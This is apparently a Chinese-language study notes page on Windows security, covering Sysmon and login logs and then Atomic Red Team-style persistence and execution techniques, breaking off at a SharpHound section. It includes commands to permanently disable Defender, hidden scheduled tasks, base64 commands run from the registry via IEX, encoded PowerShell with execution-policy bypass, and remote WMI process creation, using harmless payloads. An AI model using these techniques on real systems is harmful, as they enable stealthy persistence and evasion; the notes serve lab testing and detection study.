# Windows 安全

> [Powershell 攻击指南 2——Empire_powershsell empire_willowpy 的博客-CSDN 博客](https://blog.csdn.net/qq_34640691/article/details/110686135)

---

- [Windows 安全](#windows-安全)
  - [永久关闭 Windows 实时防护](#永久关闭-windows-实时防护)
  - [Sysmon](#sysmon)
    - [简介](#简介)
    - [功能概述](#功能概述)
    - [使用](#使用)
  - [查看登录日志](#查看登录日志)
  - [Process Explorer - 查看某个窗口是哪个进程调起的](#process-explorer---查看某个窗口是哪个进程调起的)
  - [计划任务](#计划任务)
    - [schtasks](#schtasks)
    - [PowerShell Cmdlet](#powershell-cmdlet)
    - [WMI Invoke-CimMethod 计划任务](#wmi-invoke-cimmethod-计划任务)
    - [创建执行从注册表读取base64编码命令的计划任务](#创建执行从注册表读取base64编码命令的计划任务)
    - [AT](#at)
  - [Windows Management Instrumentation - Windows 管理工具](#windows-management-instrumentation---windows-管理工具)
    - [在 CMD 中使用 wmic 命令查看一些系统信息](#在-cmd-中使用-wmic-命令查看一些系统信息)
    - [在 CMD 中使用 wmic 命令新建进程](#在-cmd-中使用-wmic-命令新建进程)
      - [在 powershell 中使用 wmic 命令执行 rundll32](#在-powershell-中使用-wmic-命令执行-rundll32)
    - [使用 wmic](#使用-wmic)
    - [在powershell 中使用 Invoke-WmiMethod 新建进程](#在powershell-中使用-invoke-wmimethod-新建进程)
      - [在 powershell 中从 Win32\_Process 派生一个类新建进程](#在-powershell-中从-win32_process-派生一个类新建进程)
  - [信息收集](#信息收集)
    - [域内信息收集](#域内信息收集)
      - [SharpHound](#sharphound)
    - [获取凭证](#获取凭证)
      - [Mimikatz](#mimikatz)
  - [下载与执行文件](#下载与执行文件)
    - [Net.WebClient](#netwebclient)
    - [Msxml2.ServerXmlHttp](#msxml2serverxmlhttp)
    - [Xml.XmlDocument](#xmlxmldocument)
    - [mshta](#mshta)
    - [lnk Payload](#lnk-payload)
  - [编写与执行脚本](#编写与执行脚本)
    - [base64编码命令写入注册表然后读取解码并IEX执行](#base64编码命令写入注册表然后读取解码并iex执行)
    - [利用NTFS的ADS特性将脚本写入文件隐藏数据流](#利用ntfs的ads特性将脚本写入文件隐藏数据流)
  - [Office宏](#office宏)
    - [创建于执行 Batch 脚本](#创建于执行-batch-脚本)
  - [域渗透](#域渗透)
    - [域控环境搭建](#域控环境搭建)
      - [配置网络信息](#配置网络信息)
      - [安装域服务并提升到域控](#安装域服务并提升到域控)
      - [配置 DNS 传输](#配置-dns-传输)
      - [新建一个普通的域用户](#新建一个普通的域用户)
      - [加域](#加域)
      - [从域中退出](#从域中退出)
    - [域内提权-42278/42287](#域内提权-4227842287)


---

## 永久关闭 Windows 实时防护

> [Win11 关闭 Windows Defender 实时保护，暂时关闭和永久关闭方法 | Win10 怎么永久关闭 Windows Defender 实时保护\_COCO56(徐可可) 的博客-CSDN 博客](https://blog.csdn.net/COCO56/article/details/128613164)

在需要完全关闭 Windows 防病毒设置时一般会选择在 Windows 安全中心进行相关配置

- 关闭防火墙

  ![image-20230625160629143](http://cdn.ayusummer233.top/DailyNotes/202306251606226.png)

- 关闭病毒和威胁防护

  ![image-20230625160704569](http://cdn.ayusummer233.top/DailyNotes/202306251607683.png)

  ![image-20230625160742889](http://cdn.ayusummer233.top/DailyNotes/202306251607978.png)

  不过这样关闭后, 实时防护仍旧会自动开启, 需要永久关闭的话可以参考如下流程:

  直接 Win 然后搜索组策略并打开

  ![image-20230625161403721](http://cdn.ayusummer233.top/DailyNotes/202306251614873.png)

  ![image-20230625161523466](http://cdn.ayusummer233.top/DailyNotes/202306251615540.png)

  将下面两项改为已启用

  ![image-20230625161756869](http://cdn.ayusummer233.top/DailyNotes/202306251617972.png)

  ![image-20230625161848713](http://cdn.ayusummer233.top/DailyNotes/202306251618831.png)

  然后回去看下 Windows 安全中心中的实时防护开关, 已经变成不可操作的状态了

  ![image-20230625161949403](http://cdn.ayusummer233.top/DailyNotes/202306251619476.png)

---

## Sysmon


> [Sysmon - Sysinternals | Microsoft Learn](https://learn.microsoft.com/zh-cn/sysinternals/downloads/sysmon)

---

### 简介

系统监视器(Sysmon) 是一项Windows 系统服务，也是一个设备驱动程序，一旦安装在系统上，就会在系统重新启动后一直驻留，以监视系统活动并将其记录到 Windows 事件日志中。 它提供有关进程创建、网络连接和文件创建时间更改的详细信息。 通过使用 [Windows 事件收集](https://msdn.microsoft.com/library/windows/desktop/bb427443(v=vs.85).aspx)或 [SIEM](https://en.wikipedia.org/wiki/security_information_and_event_management) 代理收集生成的事件，然后对事件进行分析，你可识别恶意或异常活动，并了解入侵者和恶意软件如何在网络上运行。

请注意，*Sysmon* 不会提供对其生成的事件的分析，也不会尝试保护或隐藏自己免受攻击者的攻击。

----

### 功能概述

*Sysmon* 包括以下功能：

- 记录当前进程和父进程中使用完整命令行创建的进程。
- 记录使用 SHA1(默认) 、MD5、SHA256 或 IMPHASH 的进程映像文件的哈希。
- 可以同时使用多个哈希。
- 在进程内创建事件之中包含一个进程 GUID，当 Windows 重新使用进程 ID 时，允许事件的相关性。
- 在每个事件中包含会话 GUID，允许同一登录会话上事件的相关性。
- 记录驱动程序或 DLL 的加载及其签名与哈希。
- 记录磁盘和卷的原始读取访问打开次数。
- (可选) 记录网络连接，包括每个连接的源进程、IP 地址、端口数量、主机名和端口名称。
- 检测文件创建时间的更改，以了解文件真正创建的时间。 修改文件创建时间戳是恶意软件惯用的伎俩来掩盖其轨道。
- 如果注册表中发生更改，则自动化重新加载配置。
- 进行规则筛选以动态包含或不包含某些事件。
- 在启动进程之初生成事件，以捕获相当复杂的内核模式恶意软件进行的活动。

---

### 使用

---

可以在 [Sysmon - Sysinternals | Microsoft Learn](https://learn.microsoft.com/zh-cn/sysinternals/downloads/sysmon)  下载 Sysmon 压缩包, 解压后通过命令行安装:

```powershell
sysmon64 -i
```

![image-20230921155938698](http://cdn.ayusummer233.top/DailyNotes/202309211559238.png)

---

使用简单命令行选项来安装和卸载 Sysmon，以及检查和修改其配置的常见用法：

安装：`sysmon64 -i [<configfile>]`
更新配置：`sysmon64 -c [<configfile>]`
安装事件清单：`sysmon64 -m`
打印架构：`sysmon64 -s`
卸载：`sysmon64 -u [force]`

| 参数   | 说明                                                                                           |
| :----- | :--------------------------------------------------------------------------------------------- |
| -i     | 安装服务和驱动程序。 (可选) 采用配置文件。                                                     |
| **-c** | 如果未提供其他参数，则更新已安装的 Sysmon 驱动程序的配置或转储当前配置。 (可选) 采用配置文件。 |
| **-m** | 安装事件清单(以及在服务安装时隐式完成) 。                                                      |
| **-s** | 打印配置架构定义。                                                                             |
| **-u** | 卸载服务和驱动程序。 使用“`-u force`”会导致卸载继续进行，即使未安装一些组件。                  |

服务会立即记录事件，驱动程序会安装为引导启动驱动程序，从引导早期开始就捕获活动，服务会将启动时间写入活动日志。

在 Vista 以及更新的系统上，事件存储在 `Applications and Services Logs/Microsoft/Windows/Sysmon/Operational` 中。 在较旧的系统中，事件写入到“`System`”事件日志。

如果需要与配置文件有关的更多信息，请使用“`-? config`”命令。

指定 `-accepteula` 在安装时自动接受 EULA，否则系统会以交互方式提示你接受。

安装或卸载都不需要重启。

---

- 查看 Sysmon 运行状态

  ```powershell
  Get-Service -Name Sysmon
  ```

  ![image-20230705150949454](http://cdn.ayusummer233.top/DailyNotes/202307051509753.png)

- 停止 Sysmon

  ```cmd
  sc stop Sysmon
  ```

  ![image-20230705153607522](http://cdn.ayusummer233.top/DailyNotes/202307051536745.png)

  ![image-20230705153619818](http://cdn.ayusummer233.top/DailyNotes/202307051536930.png)

----

## 查看登录日志

`Win+X` 或直接搜索打开事件查看器 `->  Windows日志 -> 安全` 然后 `-> 操作 -> 查找` 或者 `右键安全 -> 查找` 

![image-20231023094609789](http://cdn.ayusummer233.top/DailyNotes/202310230946237.png)

然后搜寻事件 ID 接口

- 登录成功 - 4624
- 登录失败 - 4625

![image-20231024151558584](http://cdn.ayusummer233.top/DailyNotes/202310241515737.png)

---

## Process Explorer - 查看某个窗口是哪个进程调起的

> [Process Explorer - Sysinternals | Microsoft Learn --- Process Explorer - Sysinternals | 进程资源管理器微软学习](https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer)
>
> [How to determine which process owns a toplevel window? - Super User --- 如何确定哪个进程拥有顶级窗口？ - 超级用户](https://superuser.com/questions/1299931/how-to-determine-which-process-owns-a-toplevel-window)

例如目前有个窗口不知道是哪个进程调起的, 且从视觉上也看不出什么信息, 那么可以考虑使用 Process Explorer 来进行查看, 该软件可以在  [Process Explorer - Sysinternals | Microsoft Learn --- Process Explorer - Sysinternals | 进程资源管理器微软学习](https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer) 获取

![image-20230917203502299](http://cdn.ayusummer233.top/DailyNotes/202309172035378.png)

要查看某个窗口属于哪个进程可以如下操作, 拖动该按钮到需要识别的窗口上后即会在 Process Explorer 上高亮显示该窗口所属进程:

![image-20230917203613487](http://cdn.ayusummer233.top/DailyNotes/202309172036546.png)

---

## 计划任务

### schtasks

```cmd
schtasks /create /tn "T1053_005_OnLogon" /sc onlogon /tr "cmd.exe /c calc.exe"
schtasks /create /tn "T1053_005_OnStartup" /sc onstart /ru system /tr "cmd.exe /c calc.exe"
SCHTASKS /Create /SC ONCE /TN spawn /TR "C:\windows\system32\cmd.exe" /ST "20:10"
```

- `/tn`: `Task Name`
- `/sc`: `schedule` - 后续接任务执行频率
  - `Once`: 一次性任务
  - `onlogon`: 用户登录时执行
  - `onstart`: 系统启动时执行
  - `daily`: 每天执行
- `/tr`: `Task Run` - 指定任务执行时运行的命令或程序
- `/st`: `Start Time` - 指定任务开始执行的时间
- `/S`: `Server` - 指定任务执行的服务器
- `/RU`: `Run User` - 指定任务执行的用户
- `/RP`: `Run Password` - 指定任务执行的用户密码

---

```cmd
# 列出所有计划任务
schtasks /query /FO LIST
# 查询名称包含指定字符串的计划任务(例如包含 T1053 的计划任务)
schtasks /query | findstr "T1053"
# 查询名称为 T1053_005_OnLogon 的计划任务
schtasks /query /tn "T1053_005_OnLogon"
```

- `/FO LIST` 指定输出格式为列表, 显示更详细的信息

---

```cmd
# 远程创建计划任务
# SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN "Atomic task" /TR "#{task_command}" /SC daily /ST #{time}
schtasks /Create /S [remote-ip] /RU [remote-user] /RP [passwd] /TN "Atomic task" /TR "C:/windows/system32/cmd.exe" /SC daily /ST 20:10
```

- `/S`: `Server` - 指定任务执行的服务器
- `/RU`: `Run User` - 指定任务执行的用户
- `/RP`: `Run Password` - 指定任务执行的用户密码
- `/tn`: `Task Name`
- `/tr`: `Task Run` - 指定任务执行时运行的命令或程序
- `/sc`: `schedule` - 后续接任务执行频率
  - `daily`: 每天执行
- `/st`: `Start Time` - 指定任务开始执行的时间

---

### PowerShell Cmdlet

---

```powershell
# 新建一个计划任务用于执行 calc.exe
$Action = New-ScheduledTaskAction -Execute "calc.exe"
# 新建一个计划任务触发器, 在用户登入时触发
$Trigger = New-ScheduledTaskTrigger -AtLogon
# 新建一个计划任务主体, 指定任务以管理员组的权限运行, 并且以最高权限级别运行
$User = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest
# 新建一个计划任务设置集(这里没有设置具体参数, 因此保持默认)
$Set = New-ScheduledTaskSettingsSet
# 综合前面定义的动作,触发器,主体和设置创建一个新的计划任务对象
$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set
# 将前面创建的计划任务对象注册到系统中, 任务名称为 AtomicTask, 注册后该任务将根据其配置在系统中自动运行
Register-ScheduledTask AtomicTask -InputObject $object
```

```powershell
# 新建一个计划任务用于执行 calc.exe
$Action = New-ScheduledTaskAction -Execute "cmd.exe"
# 新建一个计划任务触发器, 在用户登入时触发
$Trigger = New-ScheduledTaskTrigger -AtLogon
# 新建一个计划任务主体, 指定任务以管理员组的权限运行, 并且以最高权限级别运行
$User = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest
# 新建一个计划任务设置集(这里没有设置具体参数, 因此保持默认)
$Set = New-ScheduledTaskSettingsSet
# 综合前面定义的动作,触发器,主体和设置创建一个新的计划任务对象
$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set
# 将前面创建的计划任务对象注册到系统中, 任务名称为 AtomicTask, 注册后该任务将根据其配置在系统中自动运行
Register-ScheduledTask AtomicTaskModifed -InputObject $object
# 修改计划任务的执行动作, 将其修改为执行 notepad.exe
$NewAction = New-ScheduledTaskAction -Execute "Notepad.exe"
# 修改计划任务的执行动作
Set-ScheduledTask "AtomicTaskModifed" -Action $NewAction

# 查询该计划任务
Get-ScheduledTask -TaskName "AtomicTaskModifed"
# 删除该计划任务
Unregister-ScheduledTask -TaskName "AtomicTaskModifed" -confirm:$false
```

---

### WMI Invoke-CimMethod 计划任务

```powershell
# 读取 xml 文档内容并将其保存到变量 $xml 中
$xml = [System.IO.File]::ReadAllText("C:\AtomicRedTeam\atomics\T1053.005\src\T1053_005_WMI.xml")
Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace "Root\Microsoft\Windows\TaskScheduler" -MethodName "RegisterByXml" -Arguments @{ Force = $true; Xml =$xml; }
```

```powershell
# 读取 xml 文档内容并将其保存到变量 $xml 中
$xml = [System.IO.File]::ReadAllText("C:\AtomicRedTeam\atomics\T1053.005\src\T1053_05_SCTASK_HIDDEN_ATTRIB.xml")
# 使用 Invoke-CimMethod 命令将计划任务注册到系统中(该xml中的计划任务启用了隐藏属性)
Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace "Root\Microsoft\Windows\TaskScheduler" -MethodName "RegisterByXml" -Arguments @{ Force = $true; Xml =$xml; }
```

- `Invoke-CimMethod`: 调用 Common Information Model (CIM) 方法。

- `-ClassName PS_ScheduledTask`: 指定要调用的 CIM 类的名称
  这里是 `PS_ScheduledTask`，与 Windows 计划任务相关。

- `-NameSpace "Root\Microsoft\Windows\TaskScheduler"` 指定 CIM 命名空间
  这里是 Windows 任务调度器的命名空间。

- `-MethodName "RegisterByXml"` 调用 `RegisterByXml` 方法，这个方法用于根据提供的 XML 定义来注册一个新的计划任务。

- ```
  -Arguments @{ Force = $true; Xml =$xml; }
  ```

  - `Force = $true` 强制执行，即使已经存在具有相同名称的任务也会覆盖。
  - `Xml = $xml` 提供了任务定义的 XML 内容，这是从之前读取的文件中获取的 xml 内容

`T1053_005_WMI.xml` 内容如下:

```xml
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <!-- 任务信息 -->
  <RegistrationInfo>
    <Date>2021-04-22T12:29:17</Date>
    <Author>AtomicRedTeam</Author>
    <!-- 每个计划任务都有一个唯一的 URI 用于标识该任务。 -->
    <URI>\T1053_005_WMI</URI>
  </RegistrationInfo>
  <!-- 触发器 -->
  <Triggers>
    <!-- 登录触发器 -->
    <LogonTrigger>
      <StartBoundary>2021-04-22T12:29:00</StartBoundary>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <!-- 主体内容 -->
  <Principals>
    <Principal id="Author">
      <!-- 任务运行的用户 S-1-5-32-545 为 Users 组 -->
      <GroupId>S-1-5-32-545</GroupId>
      <!-- 运行级别, 以最低权限级别运行 -->
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <!-- 多实例策略, 如果任务已在运行, 新的实例将被忽略 -->
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <!-- 任务不会在仅使用电池供电时启动 -->
    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>
    <!-- 如果开始运行后切换到电池供电, 任务将会停止 -->
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <!-- 在网络不可用时也会运行 -->
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <!-- 允许按需启动 -->
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <!-- 不隐藏 -->
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <!-- 执行时间限制 - 任务最长运行时间为 72h -->
    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <!-- 任务执行时将执行 notepad.exe -->
  <Actions Context="Author">
    <Exec>
      <Command>notepad.exe</Command>
    </Exec>
  </Actions>
</Task>
```

`T1053_05_SCTASK_HIDDEN_ATTRIB.xml` 的内容如下:

```xml
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Version>1.1.1</Version>
    <Author>atomicredteam</Author>
    <Description>atomic red team schedule task with hidden attribute</Description>
    <URI>\atomic red team</URI>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <RunLevel>LeastPrivilege</RunLevel>
      <LogonType>InteractiveToken</LogonType>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <!-- 隐藏计划任务 -->
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>6</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>C:\Windows\system32\calc.exe"</Command>
      <Arguments></Arguments>
    </Exec>
  </Actions>
</Task>

```

- `S-1-5-32-545` 是 `Users` 组的 SID

  - `S`: 代表 SID(Security Identifier)(安全标识符), 在 Windows 中用于唯一标识用户、组、计算机等

  - `1`: 代表 SID 的版本号

  - `5`: 代表 SID 的机构标识符, 5 代表这是一个 Windows 或域账户

  - `32`: 代表 SID 的子机构标识符, 32 代表这是一个内置账户

  - `545`: 代表 SID 的相对标识符(RID), 545 代表这是 Users 组的 RID

    类似的还有:
    - `544`: Administrators 组的 RID
    - `546`: Guests 组的 RID

- 在 `T1053_05_SCTASK_HIDDEN_ATTRIB.xml` 的 `line34` 定义了隐藏该计划任务, 该计划任务在计划任务程序中将不可见

![image-20231203163355433](http://cdn.ayusummer233.top/DailyNotes/202312031634488.png)

![image-20231203181951850](http://cdn.ayusummer233.top/DailyNotes/202312031819908.png)

---

要查看这个计划任务是否已经注册到系统中, 可以使用如下命令:

```powershell
Get-ScheduledTask -TaskName "T1053_005_WMI"
# 或者使用 schtasks
schtasks /query /tn "T1053_005_WMI"

Get-ScheduledTask -TaskName "atomic red team"
schtasks /query /tn "atomic red team"
```

![image-20231203163429219](http://cdn.ayusummer233.top/DailyNotes/202312031634242.png)

可惜后者并未达成隐藏的效果:

![image-20231203182014956](http://cdn.ayusummer233.top/DailyNotes/202312031820985.png)

---

要删除这个计划任务可以使用如下命令:

```powershell
Unregister-ScheduledTask -TaskName "T1053_005_WMI" -confirm:$false
Unregister-ScheduledTask -TaskName "atomic red team" -confirm:$false
```
- `Unregister-ScheduledTask` 删除计划任务
- `TaskName` 指定要删除的计划任务名称
- `-confirm:$false` 确认删除时不需要用户确认

![image-20231203163444148](http://cdn.ayusummer233.top/DailyNotes/202312031634174.png)

---

### 创建执行从注册表读取base64编码命令的计划任务

```cmd
# 将 ping 127.0.0.1 的命令以 base64 编码后写入注册表
reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f
# 创建计划任务, 每天 07:45 执行从注册表读取的 base64 编码命令
schtasks.exe /Create /F /TN "ATOMIC-T1053.005" /TR "cmd /c start /min \"\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))" /sc daily /st 07:45
```
- `/Create` 创建计划任务
- `/F` 强制创建, 即使已经存在具有相同名称的任务也会覆盖
- `/TN` 指定任务名称
- `/TR` 指定任务执行时运行的命令或程序
- `/sc` 指定任务执行频率
  - `daily` 每天执行
- `/st` 指定任务开始执行的时间

![image-20231203174743641](http://cdn.ayusummer233.top/DailyNotes/202312031747667.png)

---

查询对应的注册表以及计划任务:

```powershell
Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005
schtasks /query /tn "ATOMIC-T1053.005"
```

![image-20231203174806582](http://cdn.ayusummer233.top/DailyNotes/202312031748619.png)

----

删除对应的注册表以及计划任务:

```powershell
reg delete HKCU\SOFTWARE\ATOMIC-T1053.005 /f
schtasks /delete /tn "ATOMIC-T1053.005" /f
```

![image-20231203174824824](http://cdn.ayusummer233.top/DailyNotes/202312031748878.png)

---

### AT

```powershell
at 13:20 /interactive cmd 
```

at 命令在 win10 中已经弃用, 在 Win7 中可以使用

> ![image-20231122162800484](http://cdn.ayusummer233.top/DailyNotes/202311221628629.png)
>
> ![image-20231122162652063](http://cdn.ayusummer233.top/DailyNotes/202311221626960.png)

---

- 根据 [at (command) - Wikipedia](https://en.wikipedia.org/wiki/At_(command)), [At Command (computerhope.com)](https://www.computerhope.com/at.htm), [Use the at command to schedule tasks - Windows Client | Microsoft Learn](https://learn.microsoft.com/en-us/troubleshoot/windows-client/system-management-components/use-at-command-to-schedule-tasks) 以及 [at | Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/at) 的信息
  - `at` 命令自 Windows NT 开始就可用于在计算机上指定的时间和日期运行命令和程序
  - 其在 `Windows NT`、`Windows 2000` 和 `Windows XP` 等早期版本中都是可用的。在Windows Vista及更新的Windows版本中，`at`命令被标记为弃用，推荐使用`schtasks`命令来替代
  - 在微软官方的 Windows Server 文档中有提到其适用于``Windows Server 2022`、`Windows Server 2019`、`Windows Server 2016`、`Windows Server 2012 R2`、`Windows Server 2012`

---

## Windows Management Instrumentation - Windows 管理工具

`WMIC(Windows Management Instrumentation Command-line)(Windows管理规范命令行)`  是一个用于访问本地或远程计算机上的管理信息的Windows命令行工具

---

### 在 CMD 中使用 wmic 命令查看一些系统信息

```powershell
# 列出系统中所有用户账户的详细信息，包括用户的各种属性，如用户名、SID(安全标识符) 、账户类型等，输出格式设置为 CSV
wmic useraccount get /ALL /format:csv
# 列出系统中所有进程的名称、它们的可执行文件路径和启动它们的命令行参数，输出格式为 CSV
wmic process get caption,executablepath,commandline /format:csv
# 获取系统上安装的更新和修补程序的详细信息，包括它们的描述和安装日期，输出格式为 CSV
wmic qfe get description,installedOn /format:csv 
```

- `xxx get`: 获取 xxx 信息
  - `useraccount`：获取用户账户信息。
  - `process`：获取与进程(程序) 相关的信息。
  - `qfe(Quick Fix Engineering)`: 获取系统上的更新和修补程序信息
- `get xxx` 获取 xxx 信息
  - `caption` 进程的名称
  - `executablepath` 可执行文件的路径
  - `commandline` 显示启动进程时使用的命令行参数。
  - `description` 描述信息
  - `installedOn` 安装日期
  - `/ALL`：返回所有可用的属性。
- `/format:csv`：指定输出格式为 CSV

> ![image-20231121151050009](http://cdn.ayusummer233.top/DailyNotes/202311211510098.png)
>
> ![image-20231121151517619](http://cdn.ayusummer233.top/DailyNotes/202311211515762.png)
>
> ![image-20231121153412521](http://cdn.ayusummer233.top/DailyNotes/202311211534644.png)

```cmd
# 查询本机上，所有描述中包含“Spooler”(打印机)的服务的信息
wmic /node:"127.0.0.1" service where (caption like "%Spooler%")
```

- `/node:"127.0.0.1"`: 指定要查询的目标节点(计算机) IP 为 `127.0.0.1` (也可以写hostname)

- `service`：指定要查询的 WMI 类别。这里表示正在查询 Windows 服务相关的信息。

- `where (caption like "%Spooler%")`：这是一个过滤条件，用于限制查询结果。

  - `caption` : 服务的描述标签。

  - `like "%Spooler%"`  筛选出描述中包含“Spooler”字样的服务。

    百分号(`%`) 是通配符，表示“Spooler”可以出现在任何位置。

>![image-20231121155454706](http://cdn.ayusummer233.top/DailyNotes/202311211554805.png)

---

### 在 CMD 中使用 wmic 命令新建进程

---

```cmd
# 在 Windows 系统上启动一个新的记事本应用程序实例
wmic process call create notepad.exe
# 在 remote_ip/hostnmae windows上启动一个新的记事本应用程序实例
wmic /user:DOMAIN\Administrator /password:Password /node:"remote_ip/hostname" process call create notepad.exe
```

- `process` 指定 wmic 在操作与系统进程相关的信息

- `call create notepad.exe`  

  - `call` 表示执行一个方法

  - `create` 是 process 类中的一个方法, 用于创建新的进程

    `notepad.exe` 是传递给 `create` 方法的参数, 指定要创建的进程为记事本

> ![image-20231121160748978](http://cdn.ayusummer233.top/DailyNotes/202311211607180.png)
>
> 远程启进程的命令不能指定  `remote_ip/hostname` 为本机的 ip, 否则会:
>
> ![image-20231121162658528](http://cdn.ayusummer233.top/DailyNotes/202311211626609.png)
>
> 远程执行示例:
>
> ![image-20231121162724037](http://cdn.ayusummer233.top/DailyNotes/202311211627101.png)
>
> > TODO: PS: 虽然这里显示执行成功了, 但是 rdp 过去并没有看到有记事本, 这里对此效果存疑

---

#### 在 powershell 中使用 wmic 命令执行 rundll32

---

```powershell
wmic /node:127.0.0.1 process call create "rundll32.exe xxx\xxx\calc.dll StartW"
wmic /node:127.0.0.1 process call create "rundll32.exe C:\AtomicRedTeam\ExternalPayloads/calc.dll StartW"
```

指示系统运行 `rundll32.exe` 程序，该程序用于调用 DLL 文件中的函数。`C:\AtomicRedTeam\ExternalPayloads/calc.dll` 是 DLL 文件的路径，而 `StartW` 是 DLL 中的一个函数。

> TODO: 这个 dll 的作用是启动计算器, 学一下怎么用 x64dbg 调试 dll



-----

### 使用 wmic

```cmd
wmic /node:"#{node}" product where "name like '#{product}%%'" call uninstall
```





---

### 在powershell 中使用 Invoke-WmiMethod 新建进程

---

```powershell
powershell -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA
```

- **`-exec bypass`**: 绕过 PowerShell 的执行策略。

  默认情况下 Windows 为了安全起见可能会限制运行某些脚本。使用 `-exec bypass` 可以绕过这些限制，允许运行没有签名的脚本。

- **`-e`**: 这是 PowerShell 的一个参数，用于执行经过 Base64 编码的命令。

使用 powershell 执行一个 `utf-16le` 编码的命令, 可以使用 python `base64.b64decode(*enc_cmd*).decode("utf-16-le")`  解码该命令, 得到:

```powershell
Invoke-WmiMethod -Path win32_process -Name create -ArgumentList notepad.exe
```

- `Invoke-WmiMethod`：调用 `Windows Management Instrumentation (WMI) `方法

- `-Path win32_process`：指定 WMI 类的路径，`win32_process` 是一个用于表示系统进程的 WMI 类。

- `-Name create`: 调用的 WMI 方法的名称，在这里是 `create`，用于创建新的进程

- `-ArgumentList notepad.exe`：传递给 `create` 方法的参数，表示要创建的进程。

  在此示例中将启动 Windows 记事本应用程序(Notepad) 

---

#### 在 powershell 中从 Win32_Process 派生一个类新建进程

---

```powershell
# 创建一个 ManagementClass 对象，代表 Win32_Process WMI 类
$Class = New-Object Management.ManagementClass(New-Object Management.ManagementPath("Win32_Process"))
# 从 Win32_Process 类派生出一个新的类，并命名为 Win32_Atomic
$NewClass = $Class.Derive("Win32_Atomic")
# 将新创建的 Win32_Atomic 类注册到 WMI 命名空间中。这意味着，之后可以像其他标准 WMI 类一样使用 Win32_Atomic。
$NewClass.Put()
# 使用 Invoke-WmiMethod 命令调用 Win32_Atomic 类的 create 方法新建一个进程启动记事本
Invoke-WmiMethod -Path Win32_Atomic -Name create -ArgumentList notepad.exe

# Clean
# 创建一个指向 Win32_Atomic 类的 ManagementClass 对象。
$CleanupClass = New-Object Management.ManagementClass(New-Object Management.ManagementPath("Win32_Atomic"))
# 尝试删除 Win32_Atomic 类
try { $CleanupClass.Delete() } catch {}
```

- `Win32_Process` 是一个预定义的 WMI 类，用于表示和操作系统进程相关的信息。

- 派生操作是在 WMI 中创建一个新的类，它继承了父类的所有属性和方法。

- 由于 Win32_Atomic 类是从 Win32_Process 类派生的，它继承了 create 方法，该方法用于创建新的进程。

  在这个例子中，它被用来启动 Windows 的记事本应用程序(Notepad) 。

  ---

- `try { $CleanupClass.Delete() } catch {}`:用于尝试执行某些操作，并捕获如果这些操作失败时产生的任何异常。

  在 `try` 块中，代码尝试调用 `$CleanupClass.Delete()`，这个方法用于从 WMI 命名空间中删除 `Win32_Atomic` 类。

---

## 信息收集

### 域内信息收集

#### SharpHound

下载文件再执行:

```powershell
New-Item -Type Directory "C:\AtomicRedTeam\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
